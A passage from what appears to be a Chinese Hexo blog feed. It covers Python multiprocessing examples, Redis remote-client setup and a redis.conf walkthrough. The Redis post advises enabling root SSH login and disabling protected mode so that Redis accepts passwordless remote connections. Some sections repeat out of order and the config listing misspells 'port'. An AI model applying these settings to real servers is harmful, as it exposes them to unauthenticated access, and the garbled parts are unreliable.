punctuation">.</span>authkey <span class="token operator">=</span> b<span class="token string">'123.qwe'</span> <span class="token comment" spellcheck="true"># 再次获取授权密码</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'proc授权密码'</span> <span class="token punctuation">,</span>proc<span class="token punctuation">.</span>authkey<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 显示进程名称</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'proc.name:'</span><span class="token punctuation">,</span>proc<span class="token punctuation">.</span>name<span class="token punctuation">)</span> proc<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'test'</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'proc.name:'</span><span class="token punctuation">,</span> proc<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'proc是否存活'</span><span class="token punctuation">,</span> proc<span class="token punctuation">.</span>is_alive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'进程PID'</span><span class="token punctuation">,</span>proc<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-创建函数将其作为多个子进程"><a href="#2-创建函数将其作为多个子进程" class="headerlink" title="2.创建函数将其作为多个子进程"></a>2.创建函数将其作为多个子进程</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token punctuation">,</span>os<span class="token keyword">def</span> <span class="token function">worker_1</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'start worker_1'</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'执行的进程PID:{},父进程PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>interval<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'end worker_1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">worker_2</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'start worker_2'</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'执行的进程PID:{},父进程PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>interval<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'end worker_2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">worker_3</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'start worker_3'</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'执行的进程PID:{},父进程PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>interval<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'end worker_3'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程 Start,PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>worker_1<span class="token punctuation">,</span> worker_2<span class="token punctuation">,</span> worker_3<span class="token punctuation">]</span><span class="token punctuation">:</span>     proc <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>i<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     proc<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The number of cpu is {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> multiprocessing<span class="token punctuation">.</span>active_children<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'child p.name:{}, p.id:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>name<span class="token punctuation">,</span> p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程 End'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果</p><pre class="line-numbers language-bash"><code class="language-bash">主进程 Start,PID:16707The number of cpu is 8The number of cpu is 8The number of cpu is 8child p.name:Process-2, p.id:16709child p.name:Process-3, p.id:16710child p.name:Process-1, p.id:16708主进程 Endstart worker_1执行的进程PID:16708,父进程PID:16707start worker_2执行的进程PID:16709,父进程PID:16707start worker_3执行的进程PID:16710,父进程PID:16707end worker_2end worker_1end worker_3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-定义子进程的子类"><a href="#3-定义子进程的子类" class="headerlink" title="3.定义子进程的子类"></a>3.定义子进程的子类</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义进程的一个子类,重写run方法</span><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token punctuation">,</span>os<span class="token keyword">class</span> <span class="token class-name">MyProcess</span><span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""重写run方法"""</span> <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     super<span class="token punctuation">(</span>MyProcess<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># self.pid 是 Process类的一个属性值</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程PID:{},开始时间:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pid<span class="token punctuation">,</span> time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span>         time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程:{}:结束'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""主进程"""</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程PID:{},开始时间:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     proc <span class="token operator">=</span> MyProcess<span class="token punctuation">(</span><span class="token punctuation">)</span>     proc<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程结束'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这相当与重写了<code>Process</code>类的<code>run</code> 方法.</p></blockquote><h4 id="4-带有join-方法的子进程"><a href="#4-带有join-方法的子进程" class="headerlink" title="4.带有join()方法的子进程"></a>4.带有<code>join()</code>方法的子进程</h4><blockquote><p>子进程中调用<code>join()</code> 方法,则父进程必须等待子进程执行完毕后在执行</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>multiprocessing<span class="token punctuation">,</span>time<span class="token punctuation">,</span>datetime<span class="token keyword">def</span> <span class="token function">worker_1</span><span class="token punctuation">(</span>my_time<span class="token punctuation">)</span><span class="token punctuation">:</span> info <span class="token operator">=</span> <span class="token string">'子进程开始执行,PID:{},name:{},执行时间是:{},父进程PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>     os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>my_time<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程 {} 退出'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">worker_2</span><span class="token punctuation">(</span>my_time<span class="token punctuation">)</span><span class="token punctuation">:</span> info <span class="token operator">=</span> <span class="token string">'子进程开始执行,PID:{},name:{},执行时间是:{},父进程PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>     os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>my_time<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'子进程 {} 退出'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>multiprocessing<span class="token punctuation">.</span>current_process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""主进程"""</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主进程开始'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>worker_1<span class="token punctuation">,</span> worker_2<span class="token punctuation">]</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> i <span class="token operator">==</span> worker_1<span class="token punctuation">:</span>         proc1 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>i<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         proc1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># join 表示主进程要等待子进程执行完毕后再执行</span>         proc1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         proc2 <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>i<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         proc2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>         proc2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"主进程结束"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">主进程开始子进程开始执行,PID:21180,name:Process-1,执行时间是:2019-11-02 18:30:53.030472,父进程PID:21179子进程 Process-1 退出子进程开始执行,PID:21183,name:Process-2,执行时间是:2019-11-02 18:30:58.041658,父进程PID:21179子进程 Process-2 退出主进程结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis客户端配置</title>
      <link href="/posts/37213.html"/>
      <url>/posts/37213.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="Redis客户端配置"><a href="#Redis客户端配置" class="headerlink" title="Redis客户端配置"></a><code>Redis</code>客户端配置</h2><blockquote><p>我们已经安装了<code>redis</code>,现在就启动服务,并尝试使用客户端连接</p></blockquote><h3 id="1-开启ssh"><a href="#1-开启ssh" class="headerlink" title="1.开启ssh"></a>1.开启<code>ssh</code></h3><blockquote><p>这一步不是必须的,只是<code>redis</code>安装在了远程服务器上,所以需要一个远程<code>ssh</code>的环境.</p><ul><li><p>安装<code>ssh server</code></p><pre class="line-numbers language-bash">$ sudo apt install openssh-server</code></pre></li><li><p>开启<code>root</code></p><pre><code class="bash"><code class="language-bash">$ sudo apt install openssh-server</code></pre></li><li><p>开启<code>root</code></p><pre><code class="bash">$ sudo passwd root$ su root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>生成<code>kegen</code></p><pre class="line-numbers language-bash">#  ssh-keygen -A</code></pre></li><li><p>配置<code>config</code>,打开以下几项.</p><pre><code class="bash"><code class="language-bash">#  ssh-keygen -A</code></pre></li><li><p>配置<code>config</code>,打开以下几项.</p><pre><code class="bash"># vim /etc/ssh/sshd.conf...PubkeyAuthentication yesAuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2PermitRootLogin yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>启动服务</p><pre class="line-numbers language-bash"># /etc/init.d/ssh start</code></pre></li><li><p>远程登录</p><pre><code class="bash">$ ssh root@192.168.0.101 </code></pre></li></ul></blockquote><h3 id="2-启动redis"><a href="#2-启动redis" class="headerlink" title="2.启动redis"></a>2.启动<code>redis</code></h3><blockquote><p>进入到<code>redis</code>文件夹,并修改<code>redis.config</code>文件,允许其他机器远程访问<code>redis</code>服务器.</p><pre><code class="bash"><code class="language-bash"># /etc/init.d/ssh start</code></pre></li><li><p>远程登录</p><pre><code class="bash">$ ssh root@192.168.0.101 </code></pre></li></ul></blockquote><h3 id="2-启动redis"><a href="#2-启动redis" class="headerlink" title="2.启动redis"></a>2.启动<code>redis</code></h3><blockquote><p>进入到<code>redis</code>文件夹,并修改<code>redis.config</code>文件,允许其他机器远程访问<code>redis</code>服务器.</p><pre><code class="bash"># cd redis-5.0.7/src/# vim ../redis.config       注意redis.config 文件位于redis-5.0.7 中...# 127.0.0.1    注销127.0.0.1 或者修改为0.0.0.0 表示允许所有protected-mode no   # 修改为no,允许没有密码远程访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"> ./redis-server  /home/wenyan/redis/redis-5.0.7/redis.conf  # 注意运行的时候加载刚才配置的 config 文件</code></pre></blockquote><h3 id="3-使用redis自带的客户端"><a href="#3-使用redis自带的客户端" class="headerlink" title="3.使用redis自带的客户端"></a>3.使用<code>redis</code>自带的客户端</h3><blockquote><pre><code class="bash">./redis-cli</code></pre><p>验证远程访问</p><pre><code class="bash">/redis-5.0.7/src# ./redis-cli  -h 192.168.0.101 -p 6379</code></pre><hr><p>查看语法: 获取<code>redis</code> 服务器的配置参数.</p><pre><code class="redis">&gt; config get &lt;pattern&gt;</code></pre><ul><li>可以使用<code>*</code> 号来列出所有的参数.</li><li>可以指定某个特定的参数名称</li><li>可以指定类似<code>config get s*</code> ,列出所有的<code>s</code> 开头的配置参数和值.</li></ul><p>设置语法:动态的调整<code>redis</code> 服务器的配置而不需要重启.</p><pre><code class="redis"><code class="language-bash"> ./redis-server  /home/wenyan/redis/redis-5.0.7/redis.conf  # 注意运行的时候加载刚才配置的 config 文件</code></pre></blockquote><h3 id="3-使用redis自带的客户端"><a href="#3-使用redis自带的客户端" class="headerlink" title="3.使用redis自带的客户端"></a>3.使用<code>redis</code>自带的客户端</h3><blockquote><pre><code class="bash">./redis-cli</code></pre><p>验证远程访问</p><pre><code class="bash">/redis-5.0.7/src# ./redis-cli  -h 192.168.0.101 -p 6379</code></pre><hr><p>查看语法: 获取<code>redis</code> 服务器的配置参数.</p><pre><code class="redis">&gt; config get &lt;pattern&gt;</code></pre><ul><li>可以使用<code>*</code> 号来列出所有的参数.</li><li>可以指定某个特定的参数名称</li><li>可以指定类似<code>config get s*</code> ,列出所有的<code>s</code> 开头的配置参数和值.</li></ul><p>设置语法:动态的调整<code>redis</code> 服务器的配置而不需要重启.</p><pre><code class="redis">> config set <parameter> <value><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>所有被<code>config set</code> 支持的配置参数都可以在配置文件<code>redis.conf</code> 中找到.</li><li><code>config set \config get</code> 的格式和<code>redis.conf</code> 使用的格式不一样.<ul><li>类似<code>2gb</code> 这样的在配置文件中有单位缩写,不能用在<code>config</code> 命令中.<code>config set</code> 只能显式的设定.像 <code>CONFIG SET xxx 1k</code> 这样的命令是错误的,正确的格式是 <code>CONFIG SET xxx 1000</code> .</li><li><code>save</code> 选项在<code>redis.conf</code> 中是多行存储的,但在<code>config set</code> 中,只会打印一行.</li></ul></li></ul></blockquote><h3 id="4-使用图形界面客户端"><a href="#4-使用图形界面客户端" class="headerlink" title="4.使用图形界面客户端"></a>4.使用图形界面客户端</h3><blockquote><p><code>redis</code>的客户端有很多,这里就使用一种<code>https://github.com/qishibo/AnotherRedisDesktopManager</code></p><p>下载相应的系统版本后,点击运行连接即可.界面如下,可以添加\删除<code>key\value</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302357593-10304.png" alt="10304"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>radis安装配置</title>
      <link href="/posts/23605.html"/>
      <url>/posts/23605.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="redis-安装配置"><a href="#redis-安装配置" class="headerlink" title="redis 安装配置"></a><code>redis</code> 安装配置</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><blockquote><p>是一个高性能的 <code>key-value</code>数据库</p></blockquote><h3 id="2-安装配置"><a href="#2-安装配置" class="headerlink" title="2.安装配置"></a>2.安装配置</h3><blockquote><p>使用官网的<a href="https://redis.io/download" target="_blank" rel="noopener">安装</a></p><pre class="line-numbers language-shell"><code class="language-shell">$ wget http://download.redis.io/releases/redis-5.0.7.tar.gz$ tar xzf redis-5.0.7.tar.gz$ cd redis-5.0.7$ make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行完毕后,会生成一个新的<code>src</code> 文件目录,里面存放了所有的<code>redis</code> 的相关工具和配置文件.</p><p>可以直接运行<code>redis</code> 服务器</p><pre class="line-numbers language-shell"><code class="language-shell">[root@localhost src]# ./redis-server port 6379pid 67606<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到,直接运行是前台运行,默认端口是<code>6379</code> ,一般来说,我们都是运行在后台的,可以编辑它的配置文件<code>redis.conf</code> 配置.这个文件位于<code>redis-5.0.7</code> 中.</p><pre class="line-numbers language-shell"><code class="language-shell">[root@localhost src]# cp ../redis.conf ./[root@localhost src]# vim redis.conf # 编辑如下选项,启动后台守护进程daemonize yes[root@localhost src]# ./redis-server redis.conf[root@localhost src]# ps -aux | grep redisroot      67749  0.2  0.1 153848  2340 ?         ./redis-server 127.0.0.1:6379root      67762  0.0  0.0 112676   984 pts/0   grep --color=auto redis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-redis-conf"><a href="#3-redis-conf" class="headerlink" title="3.redis.conf"></a>3.<code>redis.conf</code></h3><blockquote><p>配置文件详解</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># redis.conf</span><span class="token comment" spellcheck="true"># redis服务器加载配置文件运行类似于</span><span class="token comment" spellcheck="true"># ./redis-server /path/to/redis.conf</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 配置文件中需要设置内存大小时,可以使用1k,5GB,4M 等数据格式,转化如下</span><span class="token comment" spellcheck="true"># 1k => 1000 bytes</span><span class="token comment" spellcheck="true"># 1kb => 1024 bytes</span><span class="token comment" spellcheck="true"># 1m => 1000000 bytes</span><span class="token comment" spellcheck="true"># 1mb => 1024*1024 bytes</span><span class="token comment" spellcheck="true"># 1g => 1000000000 bytes</span><span class="token comment" spellcheck="true"># 1gb => 1024*1024*1024 bytes</span><span class="token comment" spellcheck="true"># 不区分大小写</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 指定reids 只接受来自该ip地址的请求,如果不设置,就处理所有的请求.</span><span class="token comment" spellcheck="true"># 在生产环境中最好设置这项</span><span class="token comment" spellcheck="true"># 可以绑定多个ip地址</span><span class="token comment" spellcheck="true"># bind 192.168.0.1 192.168.0.2</span><span class="token comment" spellcheck="true"># bind 127.0.0.1</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 指定redis 运行的端口</span>prot <span class="token number">6379</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># daemonize no 默认情况下,redis不是后台运行的,如果要后台运行,要设置成yes</span>daemonize yes<span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 是否开启保护,默认是yes</span><span class="token comment" spellcheck="true"># 如果配置中没有指定bind和密码,开启这个参数,radis只会本地进行访问,拒绝外部访问</span>protected<span class="token operator">-</span>mode yes<span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 配置unix socket来让redis支持监听本地连接。</span>unixsocket <span class="token operator">/</span>var<span class="token operator">/</span>run<span class="token operator">/</span>redis<span class="token operator">/</span>redis<span class="token punctuation">.</span>sock<span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 配置unix socket使用文件的权限</span>unixsocketperm <span class="token number">700</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 当redis运行的时候,redis默认把pid 文件放在/var/run/redis.pid可以配置到其他地址</span><span class="token comment" spellcheck="true"># 当运行多个redis服务器时,需要指定不同的pid文件和端口</span>pidfile <span class="token operator">/</span>var<span class="token operator">/</span>run<span class="token operator">/</span>redis_6379<span class="token punctuation">.</span>pid<span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 设置客户端的连接超时时间,单位为秒.</span><span class="token comment" spellcheck="true"># 0 为关闭该设置</span>timeout <span class="token number">0</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 指定日志级别</span><span class="token comment" spellcheck="true"># redis 支持和4个级别,</span><span class="token comment" spellcheck="true"># debug 记录很多信息,用于开发和测试</span><span class="token comment" spellcheck="true"># varbose 有用的信息,但是没有debug那么多</span><span class="token comment" spellcheck="true"># notice 普通的verbose用于生产环境</span><span class="token comment" spellcheck="true"># warning  纪录非常重要或严重的信息</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true"># 配置log文件地址</span><span class="token comment" spellcheck="true"># 默认是stdout,标准输出,如果是后台模式会输出到/dev/null</span><span class="token comment" spellcheck="true"># logfile ""</span>logfile <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>redis<span class="token operator">/</span>redis<span class="token punctuation">.</span>log<span class="token comment" spellcheck="true"># 是否打开记录syslog功能</span><span class="token comment" spellcheck="true"># syslog-enabled no</span><span class="token comment" spellcheck="true"># syslog的标识符</span><span class="token comment" spellcheck="true"># 